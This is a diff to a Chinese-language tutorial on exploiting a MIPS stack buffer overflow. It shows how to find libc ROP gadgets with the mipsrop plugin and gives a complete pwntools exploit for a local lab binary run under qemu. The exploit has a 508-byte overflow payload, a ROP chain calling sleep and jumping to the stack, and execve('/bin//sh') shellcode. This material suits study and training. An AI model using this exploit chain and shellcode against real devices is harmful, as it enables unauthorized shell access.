@@ -184,6 +184,7 @@ Found 20 matching gadgets
 ```
 如果没有合适的，我们可以尝试找在一些 "*dir" 的函数结尾来查找，有没有合适的，例如我在 readdir64 函数的末尾发现如下 gadget
 ![image-20201029161619764](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201029161619764.png)
+
 这样我们就能控制 s2 寄存器也能控制 PC，下一步就是跳到 sleep, 但是单纯的跳到 sleep 是不够的，同时我们要保证执行完 sleep 后能跳到下一个 gadget ，所以我们还需要一个既能 执行 sleep 又能控制下一个 PC 地址的 gadget
 看了眼寄存器，此时 我们还能控制的还挺多，例如我这里找 $a3 的寄存器
 ```
@@ -196,7 +197,9 @@ Python>mipsrop.find("mov $t9, $s3")
 |  0x000949EC  |  move $t9,$s3                                        |  jalr  $s3                             |
 ....
 ```
-例如
+通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作
+
+
 ```
 .text:000949EC                 move    $t9, $s3
 .text:000949F0                 jalr    $t9 ; uselocale
@@ -215,11 +218,11 @@ Python>mipsrop.find("mov $t9, $s3")
 通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作
 #### 2. jmp shellcode
 
-  下一步就是跳到 shellcode ，要跳到shellcode 我们先需要获得栈地址
+下一步就是跳到 shellcode ，要跳到shellcode 我们先需要获得栈地址
 
-  我们先用 `Python>mipsrop.stackfinder()`
+我们先用 `Python>mipsrop.stackfinder()`
 
-  获得 如下 gadget
+获得 如下 gadget
 
   ```asm
   .text:00095B74                 addiu   $a1, $sp, 52
@@ -229,8 +232,8 @@ Python>mipsrop.find("mov $t9, $s3")
   .text:00095B84                 move    $t9, $s5
   .text:00095B88                 jalr    $t9
   ```
-  该 gadget 可以将栈地址， 即 $sp+24 的值赋值给 $a0 ，那么这个栈就是我们即将填充 shellcode 的地方， $s5 可控，最后这段 gadget 会跳往 $s5 , 那么我们只需要再找一个直接 jr $a0 的gadget 即可
-  ```
+该 gadget 可以将栈地址， 即 $sp+24 的值赋值给 $a0 ，那么这个栈就是我们即将填充 shellcode 的地方， $s5 可控，最后这段 gadget 会跳往 $s5 , 那么我们只需要再找一个直接 jr $a0 的gadget 即可
+```
   Python>mipsrop.find("move $t9, $a1")
   ----------------------------------------------------------------------------------------------------------------
   |  Address     |  Action                                              |  Control Jump                          |
@@ -248,107 +251,100 @@ Python>mipsrop.find("mov $t9, $s3")
   |  0x00137CF4  |  move $t9,$a1                                        |  jr    $a1                             |
   ----------------------------------------------------------------------------------------------------------------
   Found 11 matching gadgets
-  ```
-  这里使用的是 
-  ```
+```
+这里使用的是 
+```
   .text:0012568C                 move    $t9, $a1
   .text:00125690                 move    $a3, $v0
   .text:00125694                 move    $a1, $a0
   .text:00125698                 jalr    $t9
-  ```
-  最后的 exploit
+```
+最后的 exploit
 
-  ```python
-  from pwn import *
+```python
+from pwn import *
+# context.log_level = 'debug'
   
-  # context.log_level = 'debug'
-  
-  
-  libc_base = 0x7f61f000
-  set_a0_addr = 0xE2660
-  #.text:000E2660                 move    $t9, $s2
-  #.text:000E2664                 jalr    $t9 ; sigprocmask
-  #.text:000E2668                 li      $a0, 1
-  set_s2_addr = 0xB2EE8
-  #.text:000B2EE8                 lw      $ra, 52($sp)
-  #.text:000B2EF0                 lw      $s6, 48($sp)
-  #.text:000B2EF4                 lw      $s5, 44($sp)
-  #.text:000B2EF8                 lw      $s4, 40($sp)
-  #.text:000B2EFC                 lw      $s3, 36($sp)
-  #.text:000B2F00                 lw      $s2, 32($sp)
-  #.text:000B2F04                 lw      $s1, 28($sp)
-  #.text:000B2F08                 lw      $s0, 24($sp)
-  #.text:000B2F0C                 jr      $ra
-  jr_t9_jr_ra = 0x949EC
-  # .text:000949EC                 move    $t9, $s3
-  # .text:000949F0                 jalr    $t9 ; uselocale
-  # .text:000949F4                 move    $s0, $v0
-  # .text:000949F8
-  # .text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
-  # .text:000949F8                 lw      $ra, 0x34($sp)
-  # .text:000949FC                 move    $v0, $s0
-  # .text:00094A00                 lw      $s3, 0x24+var_sC($sp)
-  # .text:00094A04                 lw      $s2, 0x24+var_s8($sp)
-  # .text:00094A08                 lw      $s1, 0x24+var_s4($sp)
-  # .text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
-  # .text:00094A10                 jr      $ra
-  addiu_a1_sp = 0x95B74
-  # .text:00095B74                 addiu   $a1, $sp, 52
-  # .text:00095B78                 sw      $zero, 24($sp)
-  # .text:00095B7C                 sw      $v0, 20($sp)
-  # .text:00095B80                 move    $a3, $s2
-  # .text:00095B84                 move    $t9, $s5
-  # .text:00095B88                 jalr    $t9
-  jr_a1 = 0x12568C
-  # .text:0012568C                 move    $t9, $a1
-  # .text:00125690                 move    $a3, $v0
-  # .text:00125694                 move    $a1, $a0
-  # .text:00125698                 jalr    $t9
-  sleep = 0xB8FC0
-  
-  shellcode  = b""
-  shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
-  shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
-  shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
-  shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
-  shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
-  shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
-  shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
-  shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
-  shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
-  shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
-  shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
-  shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404
-  
-  pay =  b''
-  pay += b'a'*508
-  pay += p32(set_s2_addr+libc_base)
-  pay += b'b'*24
-  pay += b'1111'                    #s0
-  pay += b'2222'                    #s1
-  pay += p32(jr_t9_jr_ra+libc_base) #s2 - > set a0 
-  pay += p32(sleep+libc_base)       #s3
-  pay += b'5555'                    #s4
-  pay += p32(jr_a1+libc_base)     #s5
-  pay += b'7777'                    #s6
-  pay += p32(set_a0_addr+libc_base)
-  pay += b'c'*0x34
-  pay += p32(addiu_a1_sp+libc_base)
-  pay += b'd'*52
-  pay += shellcode
-  
-  
-  
-  log.info(hex(0x94A10+libc_base))
-  log.info('addiu_a0_sp_24: {}'.format(hex(addiu_a1_sp+libc_base)))
-  
-  
-  with open('payload','wb') as f:
-       f.write(pay)
-  
-  # p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])
-  p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02',pay])
-  pause()
-  p.interactive()
-  ```
+libc_base = 0x7f61f000
+set_a0_addr = 0xE2660
+#.text:000E2660                 move    $t9, $s2
+#.text:000E2664                 jalr    $t9 ; sigprocmask
+#.text:000E2668                 li      $a0, 1
+set_s2_addr = 0xB2EE8
+#.text:000B2EE8                 lw      $ra, 52($sp)
+#.text:000B2EF0                 lw      $s6, 48($sp)
+#.text:000B2EF4                 lw      $s5, 44($sp)
+#.text:000B2EF8                 lw      $s4, 40($sp)
+#.text:000B2EFC                 lw      $s3, 36($sp)
+#.text:000B2F00                 lw      $s2, 32($sp)
+#.text:000B2F04                 lw      $s1, 28($sp)
+#.text:000B2F08                 lw      $s0, 24($sp)
+#.text:000B2F0C                 jr      $ra
+jr_t9_jr_ra = 0x949EC
+# .text:000949EC                 move    $t9, $s3
+# .text:000949F0                 jalr    $t9 ; uselocale
+# .text:000949F4                 move    $s0, $v0
+# .text:000949F8
+# .text:000949F8 loc_949F8:                               # CODE XREF: strerror_l+15C↓j
+# .text:000949F8                 lw      $ra, 0x34($sp)
+# .text:000949FC                 move    $v0, $s0
+# .text:00094A00                 lw      $s3, 0x24+var_sC($sp)
+# .text:00094A04                 lw      $s2, 0x24+var_s8($sp)
+# .text:00094A08                 lw      $s1, 0x24+var_s4($sp)
+# .text:00094A0C                 lw      $s0, 0x24+var_s0($sp)
+# .text:00094A10                 jr      $ra
+addiu_a1_sp = 0x95B74
+# .text:00095B74                 addiu   $a1, $sp, 52
+# .text:00095B78                 sw      $zero, 24($sp)
+# .text:00095B7C                 sw      $v0, 20($sp)
+# .text:00095B80                 move    $a3, $s2
+# .text:00095B84                 move    $t9, $s5
+# .text:00095B88                 jalr    $t9
+jr_a1 = 0x12568C
+# .text:0012568C                 move    $t9, $a1
+# .text:00125690                 move    $a3, $v0
+# .text:00125694                 move    $a1, $a0
+# .text:00125698                 jalr    $t9
+sleep = 0xB8FC0
+
+shellcode  = b""
+shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1
+shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962
+shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f
+shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)
+shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873
+shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e
+shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)
+shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)
+shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc
+shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1
+shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab
+shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404
+
+pay =  b''
+pay += b'a'*508
+pay += p32(set_s2_addr+libc_base)
+pay += b'b'*24
+pay += b'1111'                    #s0
+pay += b'2222'                    #s1
+pay += p32(jr_t9_jr_ra+libc_base) #s2 - > set a0 
+pay += p32(sleep+libc_base)       #s3
+pay += b'5555'                    #s4
+pay += p32(jr_a1+libc_base)     #s5
+pay += b'7777'                    #s6
+pay += p32(set_a0_addr+libc_base)
+pay += b'c'*0x34
+pay += p32(addiu_a1_sp+libc_base)
+pay += b'd'*52
+pay += shellcode
+
+log.info(hex(0x94A10+libc_base))
+log.info('addiu_a0_sp_24: {}'.format(hex(addiu_a1_sp+libc_base)))
+with open('payload','wb') as f:
+    f.write(pay)
+# p = process(['qemu-mipsel-static', '-L', './mipsel', '-g', '1234','./stack_bof_02', pay])
+p = process(['qemu-mipsel-static', '-L', './mipsel', './stack_bof_02',pay])
+pause()
+p.interactive()
+```
 
